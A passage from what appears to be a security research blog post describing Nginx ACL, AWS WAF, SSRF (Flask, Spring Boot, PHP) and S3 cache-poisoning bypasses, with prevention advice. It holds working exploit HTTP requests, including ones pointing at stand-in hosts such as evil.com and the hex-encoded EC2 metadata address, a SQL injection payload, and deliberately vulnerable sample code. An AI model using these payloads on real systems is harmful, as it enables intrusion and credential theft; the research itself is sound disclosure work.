id=\\\"heading-bypassing-nginx-acl-rules-with-php-fpm-integration\\\"\u003eBypassing Nginx ACL Rules With PHP-FPM Integration\u003c/h2\u003e\\n\u003cp\u003ePHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\u003c/p\u003e\\n\u003cp\u003eLet's consider the following Nginx FPM configuration:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhen two \u003ccode\u003e.php\u003c/code\u003e files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint \u003ccode\u003e/admin.php\u003c/code\u003e, it's possible to access the admin.php file by doing the following request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThis technique only works if the second PHP file, in this case, \u003ccode\u003eindex.php\u003c/code\u003e, exists in the server structure. Take the following server code/structure as a reference:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\u003c/p\u003e\\n\u003cp\u003eSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cp\u003eTo prevent these issues, you must use the \u003ccode\u003e~\u003c/code\u003e expression Instead of the \u003ccode\u003e=\u003c/code\u003e expression on Nginx ACL rules, for example:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation ~* ^/admin {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe \u003ccode\u003e~\u003c/code\u003e expression matches the string \u003ccode\u003e/admin\u003c/code\u003e in any part of the pathname, in other words, if a user sent a request to \u003ccode\u003e/admin1337\u003c/code\u003e, the request will also be blocked.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-bypassing-aws-waf-acl\\\"\u003eBypassing AWS WAF ACL\u003c/h1\u003e\\n\u003ch2 id=\\\"heading-how-aws-waf-acls-work\\\"\u003eHow AWS WAF ACLs Work\u003c/h2\u003e\\n\u003cp\u003eAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\u003c/p\u003e\\n\u003cp\u003eYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\u003c/p\u003e\\n\u003cp\u003eHeader ACL example:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the above example, if a request contains a SQL Injection payload in the \u003ccode\u003eX-Query\u003c/code\u003e header, AWS WAF recognizes the SQL Injection attempt and responds with a \u003ccode\u003e403 Forbidden\u003c/code\u003e HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eAs you can see, the above request carried the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e at the \u003ccode\u003eX-Query\u003c/code\u003e header, and then was blocked by the AWS WAF.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-aws-waf-acl-with-line-folding\\\"\u003eBypassing AWS WAF ACL With Line Folding\u003c/h2\u003e\\n\u003cp\u003eWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\x09 (tab) and \\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eFor example, the header \u003ccode\u003e1337: Value\\\\r\\\\n\\\\t1337\u003c/code\u003e in the following request will be interpreted as \u003ccode\u003e1337: Value\\\\t1337\u003c/code\u003e in the Node.js server:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003e1337\u003c/span\u003e: Value\\n    1337\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\u003c/p\u003e\\n\u003cp\u003eUsing the same AWS WAF that protects the \u003ccode\u003eX-Query\u003c/code\u003e from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e in the \u003ccode\u003eX-Query\u003c/code\u003e header.\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/*'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    res.send(req.headers);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-attribute\\\"\u003eGET / HTTP/1.1\\\\r\\\\n\\nHost\u003c/span\u003e: target.com\\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eX-Query\u003c/span\u003e: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\\\r\\\\n\\n\\\\r\\\\n\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the provided screenshot, it is evident that the Node.js application interpreted the characters \u003ccode\u003e' or '1'='1' --\u003c/code\u003e as the value for the \u003ccode\u003eX-Query\u003c/code\u003e header. However, the AWS WAF treated it as a header name instead.\u003c/p\u003e\\n\u003cp\u003eThis bypass technique was reported to the AWS security team and fixed in 2022.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-incorrect-path-parsing-leads-to-server-side-request-forgery\\\"\u003eIncorrect Path Parsing Leads to Server-Side Request Forgery\u003c/h1\u003e\\n\u003cp\u003eIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\u003c/p\u003e\\n\u003cp\u003eIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\u003c/p\u003e\\n\u003cp\u003eNormally, a valid HTTP pathname starts with \u003ccode\u003e/\u003c/code\u003e or \u003ccode\u003ehttp(s)://domain/\u003c/code\u003e, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-flask-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Flask Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\u003c/p\u003e\\n\u003cp\u003eAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds \u003ccode\u003e404 Not Found\u003c/code\u003e:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful \u003ca target=\\\"_blank\\\" href=\\\"https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6\\\"\u003eMedium blog post\u003c/a\u003e that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com/'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\napp.run(host=\u003cspan class=\\\"hljs-string\\\"\u003e'0.0.0.0'\u003c/span\u003e, port=\u003cspan class=\\\"hljs-number\\\"\u003e8080\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eMy first thought was: \\\"\u003cem\u003eWhat if the developer forgets to add the last slash in the\u003c/em\u003e \u003ccode\u003eSITE_NAME\u003c/code\u003e \u003cem\u003evariable?\u003c/em\u003e\\\". And yes, it can lead to an SSRF.\u003c/p\u003e\\n\u003cp\u003eSince Flask also allows any ASCII character after the \u003ccode\u003e@\u003c/code\u003e, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\\\"hljs-string\\\"\u003e\\\"__main__\\\"\u003c/span\u003e:\\n    app.run(threaded=\u003cspan class=\\\"hljs-literal\\\"\u003eFalse\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003ePresented below is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@evildomain.com/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following example, I was able to fetch my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Spring Boot Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\u003c/p\u003e\\n\u003cp\u003eAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the \u003ccode\u003e?\u003c/code\u003e character, matrix parameters are separated by the \u003ccode\u003e;\u003c/code\u003e character within the URL.\u003c/p\u003e\\n\u003cp\u003eDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character \u003ccode\u003e;\u003c/code\u003e before the first slash of the HTTP pathname:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;1337/api/v1/me\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThe code snippet above utilizes the \u003ccode\u003eHttpServletRequest\u003c/code\u003e API to retrieve the requested URL through the \u003ccode\u003egetRequestURI()\u003c/code\u003e function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\u003c/p\u003e\\n\u003cp\u003eConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the \u003ccode\u003e@\u003c/code\u003e character to fetch an arbitrary endpoint as well.\u003c/p\u003e\\n\u003cp\u003eBelow is an example of the exploit request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;@evil.com/url\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\\\"\u003ePHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\u003c/p\u003e\\n\u003cp\u003eSurprisingly, PHP allows the asterisk \u003ccode\u003e*\u003c/code\u003e character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\u003c/p\u003e\\n\u003cp\u003eHowever, there are two limitations that arise with PHP:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eThis technique can only be used for the root pathname \u003ccode\u003e/\u003c/code\u003e and cannot be applied to other endpoints, in other words, the vulnerable code must be in the \u003ccode\u003eindex.php\u003c/code\u003e file;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eDots \u003ccode\u003e.\u003c/code\u003e are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eLet's consider the following PHP code for this exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-php\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e\u0026lt;?php\u003c/span\u003e\\n$site = \u003cspan class=\\\"hljs-string\\\"\u003e\\\"http://ifconfig.me\\\"\u003c/span\u003e;\\n$current_uri = $_SERVER[\u003cspan class=\\\"hljs-string\\\"\u003e'REQUEST_URI'\u003c/span\u003e];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eecho\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"\\\\n\\\\n\\\"\u003c/span\u003e;\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n\u003cspan class=\\\"hljs-meta\\\"\u003e?\u0026gt;\u003c/span\u003e\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe provided code retrieves the HTTP request pathname using \u003ccode\u003e$_SERVER['REQUEST_URI']\u003c/code\u003e and concatenates it with the destination domain.\u003c/p\u003e\\n\u003cp\u003eFor performing IP address dotless-hex encoding, you can utilize the tool \u003ca target=\\\"_blank\\\" href=\\\"https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f\\\"\u003eip-encoder.py\u003c/a\u003e.\u003c/p\u003e\\n\u003cp\u003eThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e*@0xa9fea9fe/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following proof of concept, I successfully retrieved my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent-1\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eIt is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as \u003ccode\u003ehttp://ifconfig.me/\u003c/code\u003e.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUtilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003ch1 id=\\\"heading-http-desync-cache-poisoning-attacks\\\"\u003eHTTP Desync Cache Poisoning Attacks\u003c/h1\u003e\\n\u003cp\u003eInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eBut before we continue, we must understand some functionalities of cache servers.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-cache-keys\\\"\u003eCache Keys\u003c/h2\u003e\\n\u003cp\u003eCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\u003c/p\u003e\\n\u003cp\u003eThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at \u003ccode\u003ehttps://target.com/static/main.js\u003c/code\u003e. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\u003c/p\u003e\\n\u003cp\u003eHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to \u003ccode\u003e1337.target.com\u003c/code\u003e, the cache server will attempt to retrieve the backend of the corresponding response for the \u003ccode\u003e/static/main.js\u003c/code\u003e URL using the \u003ccode\u003e1337.target.com\u003c/code\u003e host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-s3-http-desync-cache-poisoning-issue\\\"\u003eS3 HTTP Desync Cache Poisoning Issue\u003c/h2\u003e\\n\u003cp\u003eIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\u003c/p\u003e\\n\u003cp\u003eWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain \u003ccode\u003eyour.s3.amazonaws.com\u003c/code\u003e but changes the host header to \u003ccode\u003emy.s3.amazonaws.com\u003c/code\u003e, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\u003c/p\u003e\\n\u003ch3 id=\\\"heading-the-vulnerability\\\"\u003eThe Vulnerability\u003c/h3\u003e\\n\u003cp\u003eThe interpretation of host headers for S3 buckets involves two key aspects:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eWhen multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eThe following bytes are ignored if present in the header name: \u003ccode\u003e\\\\x1f\u003c/code\u003e, \u003ccode\u003e\\\\x1d\u003c/code\u003e, \u003ccode\u003e\\\\x0c\u003c/code\u003e, \u003ccode\u003e\\\\x1e\u003c/code\u003e, \u003ccode\u003e\\\\x1c\u003c/code\u003e, \u003ccode\u003e\\\\x0b\u003c/code\u003e;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eConsider the following exploitation request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: example.bucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, the cache server examines the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e and treats it like any other unkeyed header;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eSubsequently, the cache server will correctly interpret the \u003ccode\u003eexample.bucket.com\u003c/code\u003e header as a valid host header, resulting in the final cache response being associated with this host value.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUpon reaching the S3 bucket, the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e will be mistakenly interpreted as a valid host header, while the intended \u003ccode\u003eHost: example.bucket.com\u003c/code\u003e header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eThe final result is a complete cache poisoning of the page with arbitrary content.\u003c/p\u003e\\n\u003cp\u003eThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" 